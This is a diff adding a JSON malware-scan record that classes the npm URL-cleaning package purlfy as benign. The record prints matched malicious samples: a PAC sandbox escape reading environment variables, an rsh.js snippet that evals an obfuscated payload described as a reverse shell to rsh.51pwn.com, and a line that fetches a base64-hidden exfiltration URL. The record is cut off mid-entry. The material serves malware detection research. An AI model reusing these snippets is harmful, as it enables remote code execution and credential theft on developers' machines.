@@ -1,0 +1,1042 @@
+{
+  "package_name": "purlfy",
+  "package_version": "0.3.11",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:38:00.289058",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/purlfy.js",
+    "package/scripts/test.js",
+    "package/scripts/update_version.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/purlfy/0.3.11/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/purlfy/0.3.11/package/purlfy.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "purlfy_slice_1",
+          "code_snippet": "class Purlfy extends EventTarget {\n    // Static properties\n    static get version() {\n        return \"0.3.11\";\n    };\n    static #decoder = new TextDecoder();\n    static #domParser = typeof DOMParser !== \"undefined\" ? new DOMParser() : null;\n    static #AsyncFunction = async function () { }.constructor;\n    static #zeroStatistics = {\n        url: 0,\n        param: 0,\n        decoded: 0,\n        redirected: 0,\n        visited: 0,\n        char: 0\n    };\n    static #acts = {\n        url: decodeURIComponent,\n        base64: s => {\n            s = s.replaceAll('_', '/').replaceAll('-', '+');\n            const bytes = Uint8Array.from(atob(s), (m) => m.codePointAt(0));\n            return Purlfy.#decoder.decode(bytes);\n        },\n        slice: (s, startEnd) => {\n            const [start, end] = startEnd.split(\":\");\n            return s.slice(parseInt(start), end ? parseInt(end) : undefined)\n        },\n        regex: (s, regex) => {\n            const r = new RegExp(regex);\n            const m = s.match(r);\n            return m ? m[0] : \"\";\n        },\n        dom: (s) => Purlfy.#domParser.parseFromString(s, \"text/html\"),\n        sel: (s, selector) => s.querySelector(selector),\n        attr: (e, attr) => e.getAttribute(attr),\n        text: (e) => e.textContent,\n    };\n\n    fetchEnabled = false;\n    lambdaEnabled = false;\n    maxIterations = 5;\n    #log = console.log.bind(console, \"\\x1b[38;2;220;20;60m[pURLfy]\\x1b[0m\");\n    #fetch = fetch.bind(globalThis);\n    #statistics = { ...Purlfy.#zeroStatistics };\n    #rules = {};\n\n    constructor(options) {\n        super();\n        this.fetchEnabled = options?.fetchEnabled ?? this.fetchEnabled;\n        this.lambdaEnabled = options?.lambdaEnabled ?? this.lambdaEnabled;\n        this.maxIterations = options?.maxIterations ?? this.maxIterations;\n        Object.assign(this.#statistics, options?.statistics);\n        this.#log = options?.log ?? this.#log;\n        this.#fetch = options?.fetch ?? this.#fetch;\n    }\n\n    static #udfOrType(value, type) {\n        return value === undefined || typeof value === type;\n    }\n\n    static #isStandard(urlObj) {\n        return urlObj.searchParams.toString() === urlObj.search.slice(1);\n    }\n\n    static #isObject(item) {\n        return (item && typeof item === 'object' && !Array.isArray(item));\n    }\n\n    static #mergeDeep(target, ...sources) {\n        if (!sources.length) return target;\n        const source = sources.shift();\n        if (Purlfy.#isObject(target) && Purlfy.#isObject(source)) {\n            for (const key in source) {\n                if (Purlfy.#isObject(source[key])) {\n                    if (!target[key]) Object.assign(target, { [key]: {} });\n                    Purlfy.#mergeDeep(target[key], source[key]);\n                } else {\n                    Object.assign(target, { [key]: source[key] });\n                }\n            }\n        }\n        return Purlfy.#mergeDeep(target, ...sources);\n    }\n\n    static #applyActs(input, acts, logFunc) {\n        let dest = input;\n        for (const cmd of (acts)) {\n            const name = cmd.split(\":\")[0];\n            const arg = cmd.slice(name.length + 1);\n            const act = Purlfy.#acts[name];\n            if (!act) {\n                logFunc(\"Invalid act:\", cmd);\n                dest = null;\n                break;\n            }\n            try {\n                dest = act(dest, arg);\n            } catch (e) {\n                logFunc(`Error processing input with act \"${name}\":`, e);\n                dest = null;\n                break;\n            }\n        }\n        if (typeof dest === \"string\" || dest instanceof URL) {\n            return dest.toString();\n        } else {\n            return null;\n        }\n    }\n\n    clearStatistics() {\n        const increment = {};\n        for (const [key, value] of Object.entries(this.#statistics)) {\n            increment[key] = -value;\n        }\n        this.#incrementStatistics(increment);\n    }\n\n    clearRules() {\n        this.#rules = {};\n    }\n\n    getStatistics() {\n        return { ...this.#statistics };\n    }\n\n    importRules(...rulesets) {\n        Purlfy.#mergeDeep(this.#rules, ...rulesets);\n    }\n\n    #validRule(rule) {\n        if (!rule || !rule.mode || !rule.description || !rule.author) return false;\n        if ((rule.acts ?? []).includes(\"dom\") && !Purlfy.#domParser) return false;\n        switch (rule.mode) {\n            case \"white\":\n                return Array.isArray(rule.params);\n            case \"black\":\n                return Array.isArray(rule.params) && Purlfy.#udfOrType(rule.std, \"boolean\");\n            case \"param\":\n                return Array.isArray(rule.params) && (rule.acts === undefined || Array.isArray(rule.acts)) && Purlfy.#udfOrType(rule.continue, \"boolean\");\n            case \"regex\":\n                return Array.isArray(rule.regex) && Array.isArray(rule.replace) && Purlfy.#udfOrType(rule.continue, \"boolean\") && rule.regex.length === rule.replace.length;\n            case \"redirect\":\n                return this.fetchEnabled && Purlfy.#udfOrType(rule.ua, \"string\") && Purlfy.#udfOrType(rule.headers, \"object\") && Purlfy.#udfOrType(rule.continue, \"boolean\");\n            case \"visit\":\n                return this.fetchEnabled && Purlfy.#udfOrType(rule.ua, \"string\") && Purlfy.#udfOrType(rule.headers, \"object\") && (rule.acts === undefined || Array.isArray(rule.acts)) && Purlfy.#udfOrType(rule.continue, \"boolean\");\n            case \"lambda\":\n                return this.lambdaEnabled && (typeof rule.lambda === \"string\" || rule.lambda instanceof Purlfy.#AsyncFunction) && Purlfy.#udfOrType(rule.continue, \"boolean\");\n            default:\n                return false;\n        }\n    }\n\n    #matchRule(parts) {\n        let fallbackRule = null;\n        let currentRules = this.#rules;\n        for (const part of parts) {\n            if (currentRules.hasOwnProperty(\"\")) {\n                fallbackRule = currentRules[\"\"];\n            }\n            if (currentRules.hasOwnProperty(part + \"/\")) {\n                currentRules = currentRules[part + \"/\"];\n            } else if (currentRules.hasOwnProperty(part)) {\n                const rule = currentRules[part];\n                if (this.#validRule(rule)) {\n                    return rule;\n                }\n            } else {\n                let found = false;\n                for (const [key, val] of Object.entries(currentRules)) {\n                    if (!key.startsWith(\"/\")) continue;\n                    try {\n                        const sub = key.endsWith(\"/\");\n                        const regexStr = sub ? key.slice(1, -1) : key.slice(1);\n                        if (regexStr === \"\") continue;\n                        const regex = new RegExp(regexStr);\n                        if (regex.test(part)) {\n                            if (!sub && this.#validRule(val)) {\n                                return val;\n                            } else if (sub) {\n                                currentRules = val;\n                                found = true;\n                                break;\n                            }\n                        }\n                    } catch (e) {\n                        this.#log(\"Invalid regex:\", key.slice(1));\n                    }\n                }\n                if (!found) break;\n            }\n        }\n        if (currentRules.hasOwnProperty(\"\")) {\n            fallbackRule = currentRules[\"\"];\n        }\n        if (this.#validRule(fallbackRule)) {\n            return fallbackRule;\n        }\n        return null;\n    }\n\n    #incrementStatistics(increment) {\n        for (const [key, value] of Object.entries(increment)) {\n            this.#statistics[key] += value;\n        }\n        if (typeof CustomEvent === \"function\") {\n            this.dispatchEvent(new CustomEvent(\"statisticschange\", {\n                detail: increment\n            }));\n        } else {\n            this.dispatchEvent(new Event(\"statisticschange\"));\n        }\n    }\n\n    async #applyRule(urlObj, rule, logFunc) {\n        const mode = rule.mode;\n        const increment = { ...Purlfy.#zeroStatistics };\n        const lengthBefore = urlObj.href.length;\n        const paramsCntBefore = urlObj.searchParams.size;\n        let shallContinue = false;\n        switch (mode) {\n            case \"white\": {\n                const newParams = new URLSearchParams();\n                for (const param of rule.params) {\n                    if (urlObj.searchParams.has(param)) {\n                        newParams.set(param, urlObj.searchParams.get(param));\n                    }\n                }\n                urlObj.search = newParams.toString();\n                break;\n            }\n            case \"black\": {\n                if (!rule.std && !Purlfy.#isStandard(urlObj)) {\n                    logFunc(\"Non-standard URL search string:\", urlObj.search);\n                    break;\n                }\n                for (const param of rule.params) {\n                    urlObj.searchParams.delete(param);\n                }\n                urlObj.search = urlObj.searchParams.toString();\n                break;\n            }\n            case \"param\": {\n                let paramValue = null;\n                for (const param of rule.params) {\n                    if (urlObj.searchParams.has(param)) {\n                        paramValue = urlObj.searchParams.get(param);\n                        break;\n                    }\n                }\n                if (!paramValue) {\n                    logFunc(\"Parameter(s) not found:\", rule.params.join(\", \"));\n                    break;\n                }\n                const dest = Purlfy.#applyActs(paramValue, rule.acts ?? [\"url\"], logFunc);\n                if (dest && URL.canParse(dest, urlObj.href)) {\n                    urlObj = new URL(dest, urlObj.href);\n                } else {\n                    logFunc(\"Invalid URL:\", dest);\n                    break;\n                }\n                shallContinue = rule.continue ?? true;\n                increment.decoded++;\n                break;\n            }\n            case \"regex\": {\n                let newUrl = urlObj.href;\n                for (let i = 0; i < rule.regex.length; i++) {\n                    const regex = new RegExp(rule.regex[i], \"g\");\n                    const replace = rule.replace[i];\n                    newUrl = newUrl.replaceAll(regex, replace);\n                }\n                newUrl = Purlfy.#applyActs(newUrl, rule.acts ?? [], logFunc);\n                if (newUrl && URL.canParse(newUrl, urlObj.href)) {\n                    urlObj = new URL(newUrl, urlObj.href);\n                } else {\n                    logFunc(\"Invalid URL:\", newUrl);\n                    break;\n                }\n                shallContinue = rule.continue ?? true;\n                break;\n            }\n            case \"redirect\": {\n                if (!this.fetchEnabled) {\n                    logFunc(\"Redirect mode is disabled.\");\n                    break;\n                }\n                const options = {\n                    method: \"HEAD\",\n                    redirect: \"manual\",\n                    headers: rule.headers ?? {}\n                };\n                if (rule.ua) {\n                    options.headers[\"User-Agent\"] = rule.ua;\n                }\n                let dest = null;\n                try {\n                    const r = await this.#fetch(urlObj.href, options);\n                    if (r.status >= 300 && r.status < 400 && r.headers.has(\"location\")) {\n                        dest = r.headers.get(\"location\");\n                    } else if (r.url !== urlObj.href) {\n                        dest = r.url;\n                    }\n                } catch (e) {\n                    logFunc(\"Error following redirect:\", e);\n                    break;\n                }\n                if (dest && URL.canParse(dest, urlObj.href)) {\n                    const prevUrl = urlObj.href;\n                    urlObj = new URL(dest, urlObj.href);\n                    if (urlObj.href === prevUrl) {\n                        logFunc(\"No redirection made.\");\n                        break;\n                    }\n                    shallContinue = rule.continue ?? true;\n                    increment.redirected++;\n                } else {\n                    logFunc(\"Invalid redirect destination:\", dest);\n                }\n                break;\n            }\n            case \"visit\": {\n                if (!this.fetchEnabled) {\n                    logFunc(\"Visit mode is disabled.\");\n                    break;\n                }\n                const options = {\n                    method: \"GET\",\n                    redirect: \"manual\",\n                    headers: rule.headers ?? {}\n                };\n                if (rule.ua) {\n                    options.headers[\"User-Agent\"] = rule.ua;\n                }\n                let r, html = null;\n                try {\n                    r = await this.#fetch(urlObj.href, options);\n                    html = await r.text();\n                } catch (e) {\n                    logFunc(\"Error visiting URL:\", e);\n                    break;\n                }\n                if (r.status >= 300 && r.status < 400 && r.headers.has(\"location\")) {\n                    logFunc(\"Visit mode, but got redirected to:\", r.url);\n                    urlObj = new URL(r.headers.get(\"location\"), urlObj.href);\n                } else if (r.url !== urlObj.href) {\n                    logFunc(\"Visit mode, but got redirected to:\", r.url);\n                    urlObj = new URL(r.url, urlObj.href);\n                } else {\n                    const dest = Purlfy.#applyActs(html, rule.acts?.length ? rule.acts : [String.raw`regex:https?:\\/\\/.(?:www\\.)?[-a-zA-Z0-9@%._\\+~#=]{2,256}\\.[a-z]{2,6}\\b(?:[-a-zA-Z0-9@:%_\\+.~#?!&\\/\\/=]*)`], logFunc);\n                    if (dest && URL.canParse(dest, urlObj.href)) {\n                        urlObj = new URL(dest, urlObj.href);\n                    } else {\n                        logFunc(\"Invalid URL:\", dest);\n                        break;\n                    }\n                }\n                shallContinue = rule.continue ?? true;\n                increment.visited++;\n                break;\n            }\n            case \"lambda\": {\n                if (!this.lambdaEnabled) {\n                    logFunc(\"Lambda mode is disabled.\");\n                    break;\n                }\n                try {\n                    const lambda = typeof rule.lambda === \"string\" ? new Purlfy.#AsyncFunction(\"url\", rule.lambda) : rule.lambda;\n                    rule.lambda = lambda;\n                    urlObj = await lambda(urlObj);\n                    shallContinue = rule.continue ?? true;\n                } catch (e) {\n                    logFunc(\"Error executing lambda:\", e);\n                }\n                break;\n            }\n            default: {\n                logFunc(\"Invalid mode:\", mode);\n                break;\n            }\n        }\n        const paramsCntAfter = urlObj.searchParams.size;\n        increment.param += ([\"white\", \"black\"].includes(mode)) ? (paramsCntBefore - paramsCntAfter) : 0;\n        increment.char += Math.max(lengthBefore - urlObj.href.length, 0);\n        return [urlObj, shallContinue, increment];\n    }\n\n    async purify(originalUrl) {\n        let increment = { ...Purlfy.#zeroStatistics };\n        let shallContinue = true;\n        let firstRule = null;\n        let iteration = 0;\n        let urlObj;\n        this.#log(\"Purifying URL:\", originalUrl);\n        const optionalLocation = typeof location !== 'undefined' ? location.href : undefined;\n        if (originalUrl && URL.canParse(originalUrl, optionalLocation)) {\n            urlObj = new URL(originalUrl, optionalLocation);\n        } else {\n            this.#log(`Cannot parse URL ${originalUrl}`);\n            return {\n                url: originalUrl,\n                rule: \"N/A\"\n            }\n        }\n        while (shallContinue && iteration++ < this.maxIterations) {\n            const logi = (...args) => this.#log(`[#${iteration}]`, ...args);\n            const protocol = urlObj.protocol;\n            if (protocol !== \"http:\" && protocol !== \"https:\") {\n                logi(`Not a HTTP URL: ${urlObj.href}`);\n                break;\n            }\n            const hostAndPath = urlObj.host + urlObj.pathname;\n            const parts = hostAndPath.split(\"/\").filter(part => part !== \"\");\n            const rule = this.#matchRule(parts);\n            if (!rule) {\n                logi(`No matching rule found for ${urlObj.href}.`);\n                break;\n            }\n            firstRule ??= rule;\n            logi(`Matching rule: ${rule.description} by ${rule.author}`);\n            let singleIncrement;\n            [urlObj, shallContinue, singleIncrement] = await this.#applyRule(urlObj, rule, logi);\n            for (const [key, value] of Object.entries(singleIncrement)) {\n                increment[key] += value;\n            }\n            logi(\"Purified URL:\", urlObj.href);\n        }\n        if (firstRule && originalUrl !== urlObj.href) {\n            increment.url++;\n            this.#incrementStatistics(increment);\n        }\n        return {\n            url: urlObj.href,\n            rule: firstRule ? `${firstRule.description} by ${firstRule.author}` : \"N/A\"\n        };\n    }\n}\n\nif (typeof module !== \"undefined\" && module.exports) {\n    module.exports = Purlfy;\n} else {\n    this.Purlfy = Purlfy;\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.42976935108502706,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code processes and purifies URLs by applying a configurable set of rules that manipulate URL parameters, perform regex replacements, follow HTTP redirects, visit URLs to extract further URLs, and execute user-defined asynchronous lambda functions. It accesses and modifies URL components using standard URL and fetch APIs, optionally performing network requests (HTTP HEAD and GET) to follow redirects or visit URLs, and decodes base64 and other encoded strings as part of URL transformations. This enables controlled URL sanitization and transformation, potentially facilitating safe URL handling or, if misused, automated URL redirection and data extraction from web resources.",
+          "explanation": "[LLM Judgment: Benign] The provided code implements a URL purification and transformation utility that applies configurable rules to sanitize and manipulate URLs. It uses standard web APIs such as URL, fetch, and DOMParser, and supports user-defined asynchronous lambda functions for custom URL processing. While it does decode base64 strings and performs network requests (HEAD and GET) to follow redirects or visit URLs, these behaviors are consistent with legitimate URL rewriting and sanitization tools. There is no evidence of obfuscated payloads, environment variable access, arbitrary code execution outside controlled lambda functions, or data exfiltration attempts. The use of the Function constructor is limited to controlled lambda execution with explicit enabling, not arbitrary code execution from untrusted sources. Compared to the known malicious patterns, this code lacks key indicators such as sandbox escape, environment manipulation, eval of obfuscated payloads, or hidden network calls to malicious domains. Therefore, it is best classified as benign with very low confidence of maliciousness.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205442_055898_snippet_1",
+              "source_package": "pac-resolver (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205442_055898/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4514118432998657,
+              "code_similarity": 0.48565274477005005,
+              "behavior_similarity": 0.4171709418296814,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var f = this.constructor.constructor(`\n    // Running outside the sandbox:\n    console.log('Read env vars:', process.env);\n    console.log('!!! PAC file is running arbitrary code !!!');\n    console.log('Can read & could exfiltrate env vars ^');\n    console.log('Can kill parsing process, like so:');\n    process.exit(100); // Kill the vulnerable process\n    // etc etc\n`);\n\nf();",
+                "code_behavior": "At runtime, the code is executed when a PAC file is parsed, uses the Function constructor to escape the intended JavaScript sandbox, accesses process.env to read environment variables, and calls process.exit to terminate the process, resulting in arbitrary code execution and potential data exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code leverages the Function constructor (this.constructor.constructor) within a user-supplied PAC file to break out of the JavaScript sandbox, directly accessing Node.js process resources such as environment variables and process control functions.",
+                  "violated_expectations": "PAC files are expected to contain only proxy selection logic and should not be able to access process-level resources or execute arbitrary code outside the intended PAC evaluation context.",
+                  "similar_legitimate_use": "The Function constructor may be used for dynamic code generation in trusted, internal scripts, but it is never appropriate to use it with untrusted, user-supplied code in a security-sensitive context such as PAC file evaluation.",
+                  "key_indicators": [
+                    "Use of this.constructor.constructor (Function constructor) in user-supplied PAC file",
+                    "Access to process.env from PAC file context",
+                    "Invocation of process.exit() from PAC file",
+                    "Execution of arbitrary code outside intended PAC logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when parsing PAC file)",
+                  "file_location": "User-supplied PAC file (parsed by pac-resolver via degenerator)",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars",
+                    "process control"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pac-resolver",
+                  "package_manager": "npm",
+                  "package_versions": "<5.0.0",
+                  "why_malicious": "The package is vulnerable to remote code execution (RCE) when parsing attacker-controlled PAC files. Malicious JavaScript within a PAC file can escape the intended sandbox and execute arbitrary code in the Node.js process, leading to full compromise of the host environment. The vulnerability is due to unsafe use of the Node.js 'vm' module in the dependency chain (degenerator), which fails to provide a secure sandbox and allows untrusted code to access sensitive process resources."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a malicious PAC file containing JavaScript that uses the Function constructor to escape the sandbox.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of arbitrary code in the Node.js process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "pac-resolver parses the PAC file and, via degenerator, executes the malicious code using the vm module.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code runs with full access to process.env and process control"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code reads environment variables, prints or exfiltrates them, and can terminate the process or perform other malicious actions.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Full compromise of the Node.js process and potential data exfiltration"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of user-supplied PAC files containing Function constructor or this.constructor.constructor",
+                    "Access to process.env or process.exit from within PAC file context",
+                    "Use of vm.runInNewContext with untrusted input"
+                  ],
+                  "file_indicators": [
+                    "PAC files with embedded Function constructor usage",
+                    "PAC files containing references to process.env or process.exit"
+                  ],
+                  "network_indicators": [
+                    "Unexpected outbound connections initiated during PAC file parsing (if exfiltration is attempted)",
+                    "Unusual traffic patterns following PAC file updates"
+                  ],
+                  "how_to_detect": "Monitor for PAC files or scripts that use the Function constructor, this.constructor.constructor, or access process.env/process.exit. Audit usage of the vm module in application dependencies, especially where untrusted input is parsed. Flag any PAC file parsing that results in process termination or access to sensitive environment variables. Use static analysis to detect dangerous patterns in PAC files and dynamic monitoring to catch unexpected process behaviors during PAC file evaluation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42645877599716187,
+              "code_similarity": 0.5371201634407043,
+              "behavior_similarity": 0.315797358751297,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_130801_495474_snippet_3",
+              "source_package": "Unknown (multiple suspicious npm packages, names not specified in the excerpt) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_130801_495474/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4150472581386566,
+              "code_similarity": 0.400023877620697,
+              "behavior_similarity": 0.4300706386566162,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Example (reconstructed obfuscation technique)\nconst payload = Buffer.from('aHR0cHM6Ly9tYWxpY2lvdXMtZG9tYWluLmNvbS9leGZpbA==', 'base64').toString('utf8');\nrequire('https').get(payload);",
+                "code_behavior": "At import-time, the code decodes a base64-encoded URL to reveal a malicious domain and initiates an outbound network request to that domain, potentially downloading additional payloads or signaling compromise.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscating network destinations using base64 encoding is a common evasion technique in malware, intended to bypass static analysis and detection.",
+                  "violated_expectations": "Legitimate packages do not hide network destinations or initiate network requests to unknown domains at import-time, especially using encoded strings.",
+                  "similar_legitimate_use": "Some analytics libraries may obfuscate endpoints for anti-tampering, but not for downloading code or contacting unknown domains.",
+                  "key_indicators": [
+                    "Base64 or other encoding of URLs or network destinations",
+                    "Network requests to dynamically decoded domains",
+                    "Potential for dynamic payload delivery or command-and-control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js or a secondary dependency package",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (multiple suspicious npm packages, names not specified in the excerpt)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (not specified in the excerpt)",
+                  "why_malicious": "The packages were intentionally crafted by a nation-state threat actor (Lazarus Group) to infiltrate the software supply chain of blockchain and cryptocurrency companies. The packages contained obfuscated and encoded malicious payloads, split across multiple packages to evade detection, and were distributed using social engineering tactics to trick developers into installing them. The primary goal was to harvest sensitive credentials and keys from developer environments and exfiltrate them to attacker-controlled infrastructure."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is socially engineered into installing a malicious npm package, often via a fake developer persona or targeted outreach.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed on the developer's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or during postinstall, harvesting sensitive data such as environment variables and SSH keys from the victim's environment.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
